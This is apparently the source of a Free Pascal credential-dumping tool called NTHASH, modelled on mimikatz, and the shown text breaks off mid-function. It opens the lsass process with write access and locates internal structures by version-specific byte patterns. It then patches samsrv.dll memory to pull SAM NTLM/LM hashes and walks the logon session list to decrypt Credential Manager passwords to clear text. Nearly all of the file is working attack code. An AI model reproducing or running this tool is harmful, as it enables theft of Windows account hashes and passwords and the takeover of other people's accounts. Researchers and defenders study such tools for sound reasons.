{$mode delphi}{$H+}

program NTHASH;

uses windows, classes, sysutils, dos, usamlib, usid, upsapi, uimagehlp,
  uadvapi32, utils, untdll, umemory, ucryptoapi, usamutils, uofflinereg,
  uvaults, uLSA;

type _LUID =record
     LowPart:DWORD;
     HighPart:LONG;
end;

  //session_entry to creds_entry to cred_hash_entry to ntlm_creds_block

  type _credentialkeys=record
       unk1:array[0..55] of byte; //lots of things i am missing ...
       ntlmhash:array[0..15] of byte;
       end;
    Pcredentialkeys=^_credentialkeys;
  type _CRED_NTLM_BLOCK=record
       domainlen1:word;
       domainlen2:word;
       unk1:dword;
       domainoff:word;
       unk2:array[0..5] of byte;
       //+16
       usernamelen1:word;
       usernamelen2:word;
       unk3:dword;
       usernameoff:word;
       unk4:array[0..5] of byte;
       //+32
       ntlmhash:array[0..15] of byte;
       lmhash:array[0..15] of byte;
       //+64
       //sha1
       //domain
       //username
       end;
    PCRED_NTLM_BLOCK=^_CRED_NTLM_BLOCK;

  type _KIWI_MSV1_0_PRIMARY_CREDENTIALS =record
	//probably a lsa_unicode_string len & bufer
       len:word;
       maxlen:word;
       unk1:dword;
       Primary:pointer; //a string like Primary#0 or CredentialKeys#
       //
       Credentials:LSA_UNICODE_STRING; //buffer contains a cred_ntlm_block

        end;
 PKIWI_MSV1_0_PRIMARY_CREDENTIALS=^_KIWI_MSV1_0_PRIMARY_CREDENTIALS;

  type _KIWI_MSV1_0_CREDENTIALS =record
	next:pointer;    //loop ...
	AuthenticationPackageId:DWORD;
	PrimaryCredentials:PKIWI_MSV1_0_PRIMARY_CREDENTIALS;
  end;
PKIWI_MSV1_0_CREDENTIALS=^_KIWI_MSV1_0_CREDENTIALS;

type _KIWI_MSV1_0_LIST_63 =record
	Flink:nativeuint;	//off_2C5718
	Blink:nativeuint; //off_277380
	unk0:pvoid; // unk_2C0AC8
	unk1:ULONG; // 0FFFFFFFFh
	unk2:PVOID; // 0
	unk3:ULONG; // 0
	unk4:ULONG; // 0
	unk5:ULONG; // 0A0007D0h
	hSemaphore6:handle; // 0F9Ch
	unk7:PVOID; // 0
	hSemaphore8:HANDLE; // 0FB8h
	unk9:PVOID; // 0
	unk10:PVOID; // 0
	unk11:ULONG; // 0
	unk12:ULONG; // 0
	unk13:PVOID; // unk_2C0A28
	LocallyUniqueIdentifier:_LUID; //LUID would work
	SecondaryLocallyUniqueIdentifier:_LUID;
	waza:array[0..11] of byte; /// to do (maybe align)
	UserName:LSA_UNICODE_STRING;
	Domain:LSA_UNICODE_STRING;
	unk14:PVOID;
	unk15:PVOID;
	Type_:LSA_UNICODE_STRING;
	pSid:PSID;
	LogonType:ULONG;
	unk18:PVOID;
	Session:ULONG;
	LogonTime:LARGE_INTEGER; // autoalign x86
	LogonServer:LSA_UNICODE_STRING;
	Credentials:pointer; //PKIWI_MSV1_0_CREDENTIALS;
	unk19:PVOID;
	unk20:PVOID;
	unk21:PVOID;
	unk22:ULONG;
	unk23:ULONG;
	unk24:ULONG;
	unk25:ULONG;
	unk26:ULONG;
	unk27:PVOID;
	unk28:PVOID;
	unk29:PVOID;
	CredentialManager:PVOID; //need to investigate here - password are encrypted in clear here
        end;
 PKIWI_MSV1_0_LIST_63=^_KIWI_MSV1_0_LIST_63;

 type _KIWI_MSV1_0_LIST_61 =record
 	Flink:nativeuint;	//off_2C5718
 	Blink:nativeuint; //off_277380
 	unk0:pvoid; // unk_2C0AC8
 	unk1:ULONG; // 0FFFFFFFFh
 	unk2:PVOID; // 0
 	unk3:ULONG; // 0
 	unk4:ULONG; // 0
 	unk5:ULONG; // 0A0007D0h
	hSemaphore6:handle; // 0F9Ch
	unk7:PVOID; // 0
	hSemaphore8:HANDLE; // 0FB8h
	unk9:PVOID; // 0
	unk10:PVOID; // 0
	unk11:ULONG; // 0
	unk12:ULONG; // 0
	unk13:PVOID; // unk_2C0A28
	LocallyUniqueIdentifier:_LUID; //LUID would work
	SecondaryLocallyUniqueIdentifier:_LUID;
	UserName:LSA_UNICODE_STRING;
	Domain:LSA_UNICODE_STRING;
	unk14:PVOID;
	unk15:PVOID;
	pSid:PSID;
	LogonType:ULONG;
	Session:ULONG;
	LogonTime:LARGE_INTEGER; // autoalign x86
	LogonServer:LSA_UNICODE_STRING;
        Credentials:pointer; //PKIWI_MSV1_0_CREDENTIALS;
        unk19:PVOID;
        unk20:PVOID;
        unk21:PVOID;
        unk22:ULONG;
	CredentialManager:PVOID
end;
   PKIWI_MSV1_0_LIST_61=^_KIWI_MSV1_0_LIST_61;

type _KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ  =record
	Flink:nativeuint;	//off_2C5718
	Blink:nativeuint; //off_277380
	unk0:pvoid; // unk_2C0AC8
	unk1:ULONG; // 0FFFFFFFFh
	unk2:PVOID; // 0
	unk3:ULONG; // 0
	unk4:ULONG; // 0
	unk5:ULONG; // 0A0007D0h
       hSemaphore6:handle; // 0F9Ch
       unk7:PVOID; // 0
       hSemaphore8:HANDLE; // 0FB8h
       unk9:PVOID; // 0
       unk10:PVOID; // 0
       unk11:ULONG; // 0
       unk12:ULONG; // 0
       unk13:PVOID; // unk_2C0A28
       LocallyUniqueIdentifier:_LUID; //LUID would work
       SecondaryLocallyUniqueIdentifier:_LUID;
       waza:array[0..11] of byte; /// to do (maybe align)
       UserName:LSA_UNICODE_STRING;
       Domain:LSA_UNICODE_STRING;
       unk14:PVOID;
       unk15:PVOID;
       pSid:PSID;
       LogonType:ULONG;
       Session:ULONG;
       LogonTime:LARGE_INTEGER; // autoalign x86
       LogonServer:LSA_UNICODE_STRING;
       Credentials:pointer; //PKIWI_MSV1_0_CREDENTIALS;
       unk19:PVOID;
       unk20:PVOID;
       unk21:PVOID;
       unk22:ULONG;
       CredentialManager:PVOID
end;
  PKIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ=^_KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ ;

type _generic_list=record
        unk1:nativeuint;
        unk2:nativeuint;
        unk3:nativeuint;
        unk4:nativeuint;
        unk5:nativeuint;
        unk6:nativeuint;
        unk7:nativeuint;
        unk8:nativeuint;
end;
 Pgeneric_list=^_generic_list;

type _LIST_ENTRY =record
   Flink:nativeuint;                      //0
   Blink:nativeuint;                      //8
   unk1:nativeuint; //608bc8c0 000000b2   //16
   unk2:nativeuint; //ffffffff 00000000   //24
   unk3:nativeuint; //00000000 00000000   //32
   unk4:nativeuint; //00000000 00000000   //40
   unk5:nativeuint; //0a0007d0 00000000   //48
   unk6:nativeuint; //000010f4 00000000   //56
   unk7:nativeuint; //00000000 00000000   //64
   unk8:nativeuint; //00000c5c 00000000   //72
   unk9:nativeuint; //00000000 00000000   //80
   unk10:nativeuint; //00000000 00000000  //88
   unk11:nativeuint; //00000000 00000000
   unk12:nativeuint; //608bca80 000000b2
   unk13:nativeuint; //1f7883e5 00000000
   unk14:nativeuint; //1f7883c4 00000000
   end;
  LIST_ENTRY=_LIST_ENTRY;
  PLIST_ENTRY=^_LIST_ENTRY;

{$ifdef CPU64}
type i_logsesslist=record
     next:nativeuint;
     prev:nativeuint;
     usagecount:nativeuint;
     this:nativeuint;
     luid:nativeuint;
     unk1:nativeuint;
     //a lsa unicode string
     len1:word;
     maxlen1:word;
     unk2:dword;
     usernameptr:nativeuint;
     //a lsa unicode string
     len2:word;
     maxlen2:word;
     unk3:dword;
     domainptr:nativeuint;
     //a lsa unicode string
     len3:word;
     maxlen3:word;
     unk4:dword;
     passwordptr:nativeuint; //??
     end;
  {$endif CPU64}

  {$ifdef CPU32}
  //works at least on win7 32 bits...
  type i_logsesslist=record
       next:nativeuint;
       prev:nativeuint;
       usagecount:nativeuint;
       this:nativeuint;
       luid:nativeuint;
       unk1:nativeuint;
       unk2:nativeuint;
       unk3:nativeuint;
       //minmax1:nativeuint;
       len1:word;
       maxlen1:word;
       usernameptr:nativeuint;
       //minmax2:nativeuint;
       len2:word;
       maxlen2:word;
       domainptr:nativeuint;
       //minmax3:nativeuint;
       len3:word;
       maxlen3:word;
       passwordptr:nativeuint; //??
       end;
    {$endif CPU32}





var
  lsass_pid:dword=0;
  p:dword;
  rid,binary,pid,server,user,oldhash,newhash,oldpwd,newpwd,password,input:string;
  oldhashbyte,newhashbyte:tbyte16;
  myPsid:PSID;
  mystringsid:pchar;

  sysdir:pchar;
  syskey,samkey,ntlmhash:tbyte16;






//********************************************************************************
function callback_QueryUsers(param:pointer=nil):dword;stdcall;
var
  status:ntstatus;
  userhandle_:thandle=thandle(-1);
  userinfo:PSAMPR_USER_INTERNAL1_INFORMATION;
  lm,ntlm:string;
begin
result:=0;
if param<>nil then
     begin
     //log(pdomainuser (param).rid) ;
     //
     Status := SamOpenUser(pdomainuser (param).domain_handle  , MAXIMUM_ALLOWED , pdomainuser (param).rid  , @UserHandle_);
     if Status <> 0 then
     begin log('SamOpenUser failed:'+inttohex(status,8),status);;end
     else log('SamOpenUser ok',status);
     //
     status:=SamQueryInformationUser(UserHandle_ ,$12,userinfo);
     if Status <> 0 then
     begin log('SamQueryInformationUser failed:'+inttohex(status,8),status);;end
     else log ('SamQueryInformationUser ok',status);
     if status=0 then
     begin
     if (userinfo^.LmPasswordPresent=1 ) then lm:=ByteToHexaString (tbyte16(userinfo^.EncryptedLmOwfPassword)  );
     if (userinfo^.NtPasswordPresent=1) then ntlm:=ByteToHexaString (tbyte16(userinfo^.EncryptedNtOwfPassword )  );
     log(pdomainuser (param).username +':'+inttostr(pdomainuser (param).rid) +':'+lm+':'+ntlm,1);
     result:=1;
     SamFreeMemory(userinfo);
     end;
     //
     end;
end;


//**********************************************************************
{
//https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c#L971
//pattern should be a parameter to make this function generic...
function search(hprocess:thandle;addr:pointer;sizeofimage:DWORD):nativeint;
const
  //search pattern
  WIN_X64:array[0..3] of byte=($49, $8d, $41, $20);
  WIN_X86:array[0..4] of byte=($c6, $40, $22, $00, $8b);

var
  i:nativeint;
  buffer,pattern:tbytes;
  read:cardinal;
begin
result:=0;
if LowerCase (osarch )='amd64' then
   begin
   setlength(buffer,4);
   setlength(pattern,4);
   CopyMemory (@pattern[0],@WIN_X64[0],length(pattern));
   end
   else
   begin
   setlength(buffer,5);
   setlength(pattern,5);
   CopyMemory (@pattern[0],@WIN_X86[0],length(pattern));
   end;
log('Searching...',0);
  for i:=nativeint(addr) to nativeint(addr)+sizeofimage-length(buffer) do
      begin
      //fillchar(buffer,4,0);
      if ReadProcessMemory( hprocess,pointer(i),@buffer[0],length(buffer),@read) then
        begin
        //log(inttohex(i,sizeof(pointer)));
        if CompareMem (@pattern [0],@buffer[0],length(buffer)) then
           begin
           result:=i;
           break;
           end;
        end;//if readprocessmemory...
      end;//for
log('Done!',0);
end;
}

function Init_Int_User_Info:tbytes;
const
PTRN_WALL_SampQueryInformationUserInternal:array[0..3] of byte=($49, $8d, $41, $20);
PTRN_WALL_SampQueryInformationUserInternal_X86:array[0..4] of byte=($c6, $40, $22, $00, $8b);
var
  pattern:array of byte;
begin

  if LowerCase (osarch )='amd64' then
     begin
     setlength(pattern,length(PTRN_WALL_SampQueryInformationUserInternal));
     CopyMemory (@pattern[0],@PTRN_WALL_SampQueryInformationUserInternal[0],length(PTRN_WALL_SampQueryInformationUserInternal));
     end
     else
     begin
     setlength(pattern,length(PTRN_WALL_SampQueryInformationUserInternal_X86));
     CopyMemory (@pattern[0],@PTRN_WALL_SampQueryInformationUserInternal_X86[0],length(PTRN_WALL_SampQueryInformationUserInternal_X86));
     end;
result:=pattern;
end;

//https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html
//https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c#L971
function dumpsam(pid:dword;user:string):boolean;
const
//offset x64
WIN_BUILD_2K3:ShortInt=	-17; //need a nop nop
WIN_BUILD_VISTA:ShortInt=	-21;
WIN_BUILD_BLUE:ShortInt=	-24;
WIN_BUILD_10_1507:ShortInt=	-21;
WIN_BUILD_10_1703:ShortInt=	-19;
WIN_BUILD_10_1709:ShortInt=	-21;
WIN_BUILD_10_1803:ShortInt=	-21; //verified
WIN_BUILD_10_1809:ShortInt=	-24;
//offset x86
WIN_BUILD_XP_86:ShortInt=-8;
WIN_BUILD_7_86:ShortInt=-8; //verified
WIN_BUILD_8_86:ShortInt=-12;
WIN_BUILD_BLUE_86:ShortInt=-8;
WIN_BUILD_10_1507_86:ShortInt=-8;
WIN_BUILD_10_1607_86:ShortInt=-12;
const
  after:array[0..1] of byte=($eb,$04);
  //after:array[0..1] of byte=($0F,$84);
var
  dummy:string;
  hprocess,hmod:thandle;
  hmods:array[0..1023] of thandle;
  MODINFO:  MODULEINFO;
  cbNeeded,count:	 DWORD;
  szModName:array[0..254] of char;
  addr:pointer;
  backup:array[0..1] of byte;
  read:cardinal;
  offset:nativeint=0;
  patch_pos:ShortInt=0;
  pattern:tbytes;
begin
  result:=false;
  if pid=0 then exit;
  //if user='' then exit;
  //
  if (lowercase(osarch)='amd64') then
     begin
     if copy(winver,1,3)='6.0' then patch_pos :=WIN_BUILD_VISTA;
     if copy(winver,1,3)='6.1' then patch_pos :=WIN_BUILD_VISTA; //win7
     if copy(winver,1,3)='6.3' then patch_pos :=WIN_BUILD_BLUE; //win 8.1
     if (pos('-1507',winver)>0) then patch_pos :=WIN_BUILD_10_1507;
     if (pos('-1703',winver)>0) then patch_pos :=WIN_BUILD_10_1703;
     if (pos('-1709',winver)>0) then patch_pos :=WIN_BUILD_10_1709;
     if (pos('-1803',winver)>0) then patch_pos :=WIN_BUILD_10_1803;
     if (pos('-1809',winver)>0) then patch_pos :=WIN_BUILD_10_1809;
     end;
  if (lowercase(osarch)='x86') then
     begin
     if copy(winver,1,3)='5.1' then patch_pos :=WIN_BUILD_XP_86;
     //vista - 6.0?
     if copy(winver,1,3)='6.1' then patch_pos :=WIN_BUILD_7_86;
     //win 8.0 ?
     if (pos('-1507',winver)>0) then patch_pos :=WIN_BUILD_10_1507_86;
     if (pos('-1607',winver)>0) then patch_pos :=WIN_BUILD_10_1607_86;
     end;
  if patch_pos =0 then
     begin
     log('no patch mod for this windows version',1);
     exit;
     end;
  log('patch pos:'+inttostr(patch_pos ),0);
  //
  hprocess:=thandle(-1);
  hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                        false,pid);
  if hprocess<>thandle(-1) then
       begin
       log('openprocess ok',0);
       //log(inttohex(GetModuleHandle (nil),sizeof(nativeint)));
       cbneeded:=0;
       if EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded) then
               begin
               log('EnumProcessModules OK',0);

               for count:=0 to cbneeded div sizeof(thandle) do
                   begin
                    if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
                      begin
                      dummy:=lowercase(strpas(szModName ));
                      //writeln(dummy); //debug
                      if pos('samsrv.dll',dummy)>0 then
                         begin
                         log('samsrv.dll found:'+inttohex(hMods[count],8),0);
                         if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
                            begin
                            log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
                            log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
                            addr:=MODINFO.lpBaseOfDll;
                            pattern:=Init_Int_User_Info ;
                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
                            log('Searching...',0);
                            offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,pattern);
                            log('Done!',0);
                            if offset<>0 then
                                 begin
                                 log('found:'+inttohex(offset,sizeof(pointer)),0);
                                 //if ReadProcessMemory( hprocess,pointer(offset+patch_pos),@backup[0],2,@read) then
                                 if ReadMem  (hprocess,offset+patch_pos,backup) then
                                   begin
                                   log('ReadProcessMemory OK '+leftpad(inttohex(backup[0],1),2)+leftpad(inttohex(backup[1],1),2),0);
                                   if WriteMem(hprocess,offset+patch_pos,after)=true then
                                        begin
                                        log('patch ok',0);
                                        try
                                        log('***************************************',0);
                                        if QueryUsers ('','',@callback_QueryUsers )=true
                                        //if QueryInfoUser (user)=true
                                           then begin log('SamQueryInformationUser OK',0);result:=true;end
                                           else log('SamQueryInformationUser NOT OK',1);
                                        log('***************************************',0);
                                        finally //we really do want to patch back
                                        if WriteMem(hprocess,offset+patch_pos,backup)=true then log('patch ok') else log('patch failed');
                                        //should we read and compare before/after?
                                        end;
                                        end
                                        else log('patch failed',1);
                                   end;
                                 end;
                            {//test - lets read first 4 bytes of our module
                             //can be verified with process hacker
                            if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
                               begin
                               log('ReadProcessMemory OK');
                               log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
                               end;
                            }
                            end;//if GetModuleInformation...
                         break; //no need to search other modules...
                         end; //if pos('samsrv.dll',dummy)>0 then
                      end; //if GetModuleFileNameExA
                   end; //for count:=0...
               end; //if EnumProcessModules...
       closehandle(hprocess);
       end;//if openprocess...

end;

//check kuhl_m_sekurlsa_utils.c
function logonpasswords(pid:dword;module:string):boolean;
const
  //dd Lsasrv!LogonSessionList in windbg
  PTRN_WN1803_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c9, $74);
  //1703 works for 1709
  PTRN_WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
  PTRN_WN61_LogonSessionList:array [0..11] of byte=($33, $f6, $45, $89, $2f, $4c, $8b, $f3, $85, $ff, $0f, $84);
  PTRN_WN63_LogonSessionList:array [0..12] of byte=($8b, $de, $48, $8d, $0c, $5b, $48, $c1, $e1, $05, $48, $8d, $05);
  PTRN_WN6x_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c0, $74);
//x86
  PTRN_WNO8_LogonSessionList_x86:array [0..7] of byte= ($89, $71, $04, $89, $30, $8d, $04, $bd);
  after:array[0..1] of byte=($eb,$04);
  //after:array[0..1] of byte=($0F,$84);
var
  dummy:string;
  hprocess,hmod:thandle;
  hmods:array[0..1023] of thandle;
  MODINFO:  MODULEINFO;
  cbNeeded,count:	 DWORD;
  szModName:array[0..254] of char;
  addr:pointer;
  offset_list:array[0..3] of byte;
  offset_list_dword:dword;
  read:cardinal;
  offset:nativeint=0;
  patch_pos:ShortInt=0;
  pattern:array of byte;
  logsesslist:array [0..sizeof(_KIWI_MSV1_0_LIST_63)-1] of byte;
  bytes:array[0..1023] of byte;
  password,decrypted:tbytes;
  username,domain:array [0..254] of widechar;
  credentials,ptr,first:nativeuint;
  CREDENTIALW:_CREDENTIALW;
begin
  if pid=0 then exit;
  //if user='' then exit;
  //
  if (lowercase(osarch)='amd64') then
     begin
     if copy(winver,1,3)='6.1' then
        begin
        setlength(pattern,sizeof(PTRN_WN61_LogonSessionList));
        copymemory(@pattern[0],@PTRN_WN61_LogonSessionList[0],sizeof(PTRN_WN61_LogonSessionList));
        //{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList},	{0, NULL}, {19,  -4}},
        patch_pos:=19;
        end ;
     if copy(winver,1,3)='6.3' then
        begin
        setlength(pattern,sizeof(PTRN_WN63_LogonSessionList));
        copymemory(@pattern[0],@PTRN_WN63_LogonSessionList[0],sizeof(PTRN_WN63_LogonSessionList));
        //{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList},	{0, NULL}, {36,  -6}},
        patch_pos:=36;
        end ;
     if copy(winver,1,3)='10.' then //win10
        begin
        setlength(pattern,sizeof(PTRN_WN1703_LogonSessionList));
        copymemory(@pattern[0],@PTRN_WN1703_LogonSessionList[0],sizeof(PTRN_WN1703_LogonSessionList));
        //{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}}
        //{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WN1803_LogonSessionList),	PTRN_WN1803_LogonSessionList},	{0, NULL}, {23,  -4}},
        //{KULL_M_WIN_BUILD_10_1903,	{sizeof(PTRN_WN6x_LogonSessionList),	PTRN_WN6x_LogonSessionList},	{0, NULL}, {23,  -4}},
        patch_pos:=23;
        end;


     end;
  if (lowercase(osarch)='x86') then
     begin
          if copy(winver,1,3)='6.1' then
          begin
          setlength(pattern,sizeof(PTRN_WNO8_LogonSessionList_x86));
          copymemory(@pattern[0],@PTRN_WNO8_LogonSessionList_x86[0],sizeof(PTRN_WNO8_LogonSessionList_x86));
          patch_pos:=-11;
          end;
     end;

  if patch_pos =0 then
     begin
     log('no patch mod for this windows version',1);
     exit;
     end;
  log('patch pos:'+inttostr(patch_pos ),0);
  //
  hprocess:=thandle(-1);
  hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                        false,pid);
  if hprocess<>thandle(-1) then
       begin
       log('openprocess ok',0);
       //log(inttohex(GetModuleHandle (nil),sizeof(nativeint)));
       cbneeded:=0;
       if EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded) then
               begin
               log('EnumProcessModules OK',0);

               for count:=0 to cbneeded div sizeof(thandle) do
                   begin
                    if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
                      begin
                      dummy:=lowercase(strpas(szModName ));
                      if pos(lowercase(module),dummy)>0 then
                         begin
                         log(module+' found:'+inttohex(hMods[count],8),0);
                         if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
                            begin
                            log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
                            log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
                            addr:=MODINFO.lpBaseOfDll;
                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
                            log('Searching...',0);
                            offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,pattern);
                            log('Done!',0);
                            if offset<>0 then
                                 begin
                                 log('found:'+inttohex(offset,sizeof(pointer)),0);
                                 //
                                 if ReadMem  (hprocess,offset+patch_pos,offset_list) then
                                   begin
                                   CopyMemory(@offset_list_dword,@offset_list[0],4);
                                   log('ReadProcessMemory OK '+inttohex(offset_list_dword{$ifdef CPU64}+4{$endif CPU64},4));
                                   //we now should get a match with .load lsrsrv.dll then dd Lsasrv!LogonSessionList
                                   //new offset to the list entry
                                   {$ifdef CPU64}
                                   offset:= offset+offset_list_dword+4+patch_pos;
                                   {$endif CPU64}
                                   {$ifdef CPU32}
                                   offset:= offset_list_dword{+patch_pos};
                                   {$endif CPU32}
                                   log('offset:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
                                   //read sesslist at offset
                                   ReadMem  (hprocess,offset,logsesslist );
                                   dummy:=inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,sizeof(pointer));
                                   //lets skip the first one
                                   ReadMem  (hprocess,_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,logsesslist );
                                   //lets loop
                                   //while dummy<>leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0') do
                                   //while dummy<>inttohex(offset,sizeof(pointer)) do
                                   while _KIWI_MSV1_0_LIST_63 (logsesslist ).flink<>offset do
                                   begin
                                   //log('entry#this:'+inttohex(i_logsesslist (logsesslist ).this ,sizeof(pointer)),0) ;
                                   log('**************************************************',1);
                                   log('entry#next:'+dummy,0) ;

                                   //log('usagecount:'+inttostr(i_logsesslist (logsesslist ).usagecount),1) ;
                                   //get username
                                   ReadMem  (hprocess,nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).username.buffer),bytes );
                                   log('username:'+strpas (pwidechar(@bytes[0])),1);
                                   //copymemory(@username[0],@bytes[0],64);
                                   //log('username:'+widestring(username),1);
                                   //get domain
                                   ReadMem  (hprocess,nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).domain.buffer),bytes );
                                   log('domain:'+strpas (pwidechar(@bytes[0])),1);
                                   //copymemory(@domain[0],@bytes[0],64);
                                   //log('domain:'+widestring(domain),1);
                                   //
                                   log('LUID:'+inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).LocallyUniqueIdentifier.lowPart ,sizeof(_LUID)),1) ;
                                   //
                                   if copy(winver,1,3)='6.1'
                                      then credentials:=nativeuint(PKIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ  (@logsesslist[0] ).CredentialManager)
                                      else credentials:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).CredentialManager);
                                   log('->CredentialManager:'+inttohex(credentials,sizeof(pvoid)),1);
                                   first:=0;
                                   if Credentials<>0 then
                                     begin
                                     //CredentialManager
                                     ReadMem  (hprocess,credentials,bytes);
                                     log(inttohex(Pgeneric_list (@bytes[0]).unk4  ,sizeof(nativeuint)),0);
                                     ReadMem  (hprocess,Pgeneric_list (@bytes[0]).unk4,bytes);
                                     ptr:=Pgeneric_list (@bytes[0]).unk3;
                                     log(inttohex(ptr  ,sizeof(nativeuint)),0);
                                     ReadMem  (hprocess,ptr,bytes);
                                     //we should loop here
                                     while 1=1 do
                                     begin
                                     log('Prev/Next:'+inttohex(Pgeneric_list (@bytes[0]).unk1,sizeof(nativeuint))+'/'+inttohex(Pgeneric_list (@bytes[0]).unk2,sizeof(nativeuint)),0);
                                     if first=0 then first:=Pgeneric_list (@bytes[0]).unk1;
                                     log('-CREDENTIALW:'+inttohex(ptr-$58  ,sizeof(nativeuint)),1);
                                     readmem(hprocess,ptr-$58,@CREDENTIALW ,sizeof(CREDENTIALW));
                                     readmem(hprocess,nativeuint(CREDENTIALW.UserName),@username[0],sizeof(username));
                                     log('UserName:'+ username,1) ;
                                     readmem(hprocess,nativeuint(CREDENTIALW.TargetName ),@username[0],sizeof(username));
                                     log('TargetName:'+ username,1) ;
                                     log('CredentialBlobSize:'+inttostr(CREDENTIALW.CredentialBlobSize),0) ;
                                     log('CredentialBlob:'+inttohex(nativeuint(CREDENTIALW.CredentialBlob),sizeof(nativeuint)),0) ;
                                     //encrypted password is $e0 aka 224 bytes later
                                     //start of credential structure is -$58
                                     //password - $110 is the pointer to the password
                                     if CREDENTIALW.CredentialBlobSize>0 then
                                     begin
                                     setlength(password,CREDENTIALW.CredentialBlobSize);
                                     ReadMem  (hprocess,nativeuint(CREDENTIALW.CredentialBlob),password );
                                     //log(ByteToHexaString(password),1);
                                     setlength(decrypted,255);
                                             if decryptLSA (CREDENTIALW.CredentialBlobSize,password,decrypted)=false
                                             then log('decryptLSA NOT OK',1)
                                             else
                                             begin
                                             log('Password:'+strpas (pwidechar(@decrypted[0]) ),1);
                                             //log(BytetoAnsiString(decrypted),1);
                                             end;
                                     end;//if CREDENTIALW.CredentialBlobSize>0 then
                                     if Pgeneric_list (@bytes[0]).unk2=first then break;
                                     ptr:=Pgeneric_list (@bytes[0]).unk2;
                                     log(inttohex(ptr  ,sizeof(nativeuint)),0);
                                     ReadMem  (hprocess,ptr,bytes);
                                     end; //while 1=1 do
                                     end; //if Credentials<>0 then
                                   //
                                   if copy(winver,1,3)='6.1'
                                      then credentials:=nativeuint(PKIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ  (@logsesslist[0] ).Credentials)
                                      else credentials:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials);
                                   log('CredentialsPtr:'+inttohex(credentials,sizeof(pointer))) ;
                                   if Credentials<>0 then
                                     begin
                                     ReadMem  (hprocess,credentials,bytes );
                                     //we should loop thru credentials...
                                     //while nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).next)<>0 do
                                     while 1=1 do
                                     begin
                                     credentials:=nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).next);
                                     log('CREDENTIALS.next:'+inttohex (nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).next),sizeof(pointer) ));
                                     log('CREDENTIALS.AuthID:'+inttohex (PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).AuthenticationPackageId,8 ),1);
                                     log('CREDENTIALS.PrimaryCredentialsPtr:'+inttohex(nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).PrimaryCredentials)+8,sizeof(pointer))) ;
                                     //primary credentials...
                                     ReadMem  (hprocess,nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).PrimaryCredentials)+8,bytes );
                                     //len will help us distinguish between "Primary" and "CredentialKeys"
                                     log('PrimaryCredentials.len:'+inttostr(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len) ) ;
                                     log('PrimaryCredentials.Primary:'+inttohex(nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).primary) ,sizeof(pointer))) ;
                                     log('PrimaryCredentials.Credentials.buffer:'+inttohex(nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer) ,sizeof(pointer))) ;
                                     log('PrimaryCredentials.Credentials.length:'+inttostr(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length )) ;
                                     //decrypt !
                                     if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length>0 then
                                       begin
